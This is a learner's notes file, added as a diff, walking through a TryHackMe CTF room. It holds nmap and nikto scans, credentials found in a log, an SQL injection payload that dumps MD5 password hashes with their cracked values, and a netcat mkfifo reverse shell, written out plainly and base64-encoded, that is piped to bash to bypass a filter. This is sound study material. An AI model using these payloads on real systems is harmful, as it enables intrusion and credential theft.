@@ -1,0 +1,170 @@
+
+These are just notes following a writeup to walkthrough through a THM room. I am here to do this as quickly as possible while enumerating more machines for later.
+
+Name: Minotaur's Labyrinth
+Date:  
+Difficulty:  
+Description:  
+Better Description:  
+Goals: Walkthrough with as many writeups and learn as much as while enumerating other machines
+Learnt: 
+ls -la or else; 
+automating filtering needs to bee done; 
+connecting info together so I don't rabbit hole into; 
+encoding reverse shells 
+
+USED [sprayc writeup](https://github.com/spayc/minotaur-box/blob/main/Minotaur-Box_Writeup.md)
+
+
+nmap -sC -sV -F 10.10.28.18 
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-07 17:39 BST
+Nmap scan report for ip-10-10-28-18.eu-west-1.compute.internal (10.10.28.18)
+Host is up (0.0064s latency).
+Not shown: 96 closed ports
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      ProFTPD
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 pub
+80/tcp   open  http     Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
+|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
+| http-title: Login
+|_Requested resource was login.html
+443/tcp  open  ssl/http Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
+|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
+| http-title: Login
+|_Requested resource was login.html
+| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
+| Not valid before: 2004-10-01T09:10:30
+|_Not valid after:  2010-09-30T09:10:30
+|_ssl-date: TLS randomness does not represent time
+3306/tcp open  mysql?
+| fingerprint-strings: 
+|   LDAPBindReq, NULL, SIPOptions, SMBProgNeg, TLSSessionReq: 
+|_    Host 'ip-10-10-25-248.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V=7.60%I=7%D=5/7%Time=6276A0D1%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,69,"e\0\0\x01\xffj\x04Host\x20'ip-10-10-25-248\.eu-west-1\.compute\.i
+SF:nternal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Mari
+SF:aDB\x20server")%r(TLSSessionReq,69,"e\0\0\x01\xffj\x04Host\x20'ip-10-10
+SF:-25-248\.eu-west-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x2
+SF:0connect\x20to\x20this\x20MariaDB\x20server")%r(SMBProgNeg,69,"e\0\0\x0
+SF:1\xffj\x04Host\x20'ip-10-10-25-248\.eu-west-1\.compute\.internal'\x20is
+SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
+SF:)%r(LDAPBindReq,69,"e\0\0\x01\xffj\x04Host\x20'ip-10-10-25-248\.eu-west
+SF:-1\.compute\.internal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x
+SF:20this\x20MariaDB\x20server")%r(SIPOptions,69,"e\0\0\x01\xffj\x04Host\x
+SF:20'ip-10-10-25-248\.eu-west-1\.compute\.internal'\x20is\x20not\x20allow
+SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
+MAC Address: 02:DD:49:EE:1B:2B (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.27 seconds
+
+
+Anonymous FTP message:
+cat message.txt
+Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
+-- Minotaur
+
+## NOTE missed one flag by not using ls -la and a message:
+Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
+-- Minotaur
+
+root@ip-10-10-25-248:~# nikto -h message.txt
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ ERROR: Cannot resolve hostname '--Minotaur'
++ ERROR: Cannot resolve hostname 'Daedalusisaclumsyperson'
++ 0 host(s) tested
+root@ip-10-10-25-248:~# nikto -h 10.10.28.18
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.28.18
++ Target Hostname:    ip-10-10-28-18.eu-west-1.compute.internal
++ Target Port:        80
++ Start Time:         2022-05-07 17:45:27 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
++ Cookie PHPSESSID created without the httponly flag
++ Retrieved x-powered-by header: PHP/8.0.7
++ The anti-clickjacking X-Frame-Options header is not present.
++ Root page / redirects to: login.html
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-44056: /sips/sipssys/users/a/admin/user: SIPS v0.2.2 allows user account info (including password) to be retrieved remotely.
++ OSVDB-3268: /imgs/: Directory indexing found.
++ OSVDB-3092: /imgs/: This might be interesting...
++ OSVDB-3268: /logs/: Directory indexing found.
++ OSVDB-3092: /logs/: This might be interesting...
++ OSVDB-3268: /icons/: Directory indexing found.
++ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
++ OSVDB-3233: /icons/README: Apache default file found.
++ /login.html: Admin login page/section found.
++ /login.php: Admin login page/section found.
++ 6544 items checked: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2022-05-07 17:45:49 (GMT1) (22 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+/log/post_log.log contains:
+
+email=Daedalus&password=g2e55kh4ck5r
+
+root@ip-10-10-25-248:~# nikto -h https://10.10.28.18
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.28.18
++ Target Hostname:    ip-10-10-28-18.eu-west-1.compute.internal
++ Target Port:        443
++ Start Time:         2022-05-07 17:54:49 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ 6544 items checked: 13 error(s) and 1 item(s) reported on remote host
++ End Time:           2022-05-07 17:55:04 (GMT1) (15 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+Logging into /login.php with the creds above.
+
+
+SQLinjection
+' or 1=1 -- -
+
+
+ID 	Name 	Password
+1	Eurycliedes	42354020b68c7ed28dcdeabd5a2baf8e
+2	Menekrates	0b3bebe266a81fbfaa79db1604c4e67f
+3	Philostratos	b83f966a6f5a9cff9c6e1c52b0aa635b
+4	Daedalus	b8e4c23686a3a12476ad7779e35f5eb6
+5	M!n0taur	1765db9457f496a39859209ee81fbda4
+
+42354020b68c7ed28dcdeabd5a2baf8e	md5	greeklover
+0b3bebe266a81fbfaa79db1604c4e67f	md5	greeksalad
+b83f966a6f5a9cff9c6e1c52b0aa635b	md5	nickthegreek
+b8e4c23686a3a12476ad7779e35f5eb6	Unknown	Not found.
+1765db9457f496a39859209ee81fbda4	md5	aminotauro
+
+
+Missed the flag on the first look of the website, but that was more because I was drawn to the namePeople/nameCreature input
+
+Next goto the echo.php.
+`id` produces 
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+It filters characters including ";"
+
+We also have to base64 encode a reverse shell so:
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.25.248 1234 >/tmp/f
+becomes
+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMjUuMjQ4IDEyMzQgPi90bXAvZgo=
+
+`echo [REMOVE THE EQUALS SIGN AS IT IS ALSO FILTERED] | base64 -d | bash`
+
+SQL is used by the Https://page so no need to enumerate
+I tried https://0xandrea.medium.com/minotaurs-labyrinth-tryhackme-room-writeup-b4dce2fae825
+For some reason the target was not returning to my address sadly..
+I retry this noting of my learning on another day. I could have broke the room also.
